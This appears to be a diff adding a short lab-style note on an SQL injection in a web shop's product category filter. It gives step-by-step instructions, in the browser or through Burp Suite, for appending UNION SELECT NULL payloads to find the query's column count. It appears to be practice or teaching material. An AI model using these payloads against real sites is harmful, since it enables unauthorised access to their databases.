@@ -1,0 +1,34 @@
+SQL injection vulnerability exists in the product category filter
+
+- Open product page
+- click on first product category 
+- add `'UNION+SELECT+NULL--` after the category in the address bar
+- `internal error` should pop up on screen
+- add `null` s until the query is printed to the screen
+	- `'UNION+SELECT+NULL,NULL--`
+	- `'UNION+SELECT+NULL,NULL,NULL--`
+
+OR 
+
+- Open product page
+- fire up burp suite
+	- Open burp 
+	- open burp browser 
+	- Proxy tab
+		- Intercept tab
+			- turn intercept on
+- click on first category 
+- modify the GET request 
+- at end of category add `'UNION+SELECT+NULL--`
+- - `internal error` should pop up on screen
+- back or refresh the screen and add `null` s until the query is printed to the screen
+	- `'UNION+SELECT+NULL,NULL--`
+	- `'UNION+SELECT+NULL,NULL,NULL--`
+
+
+
+
+
+
+
+
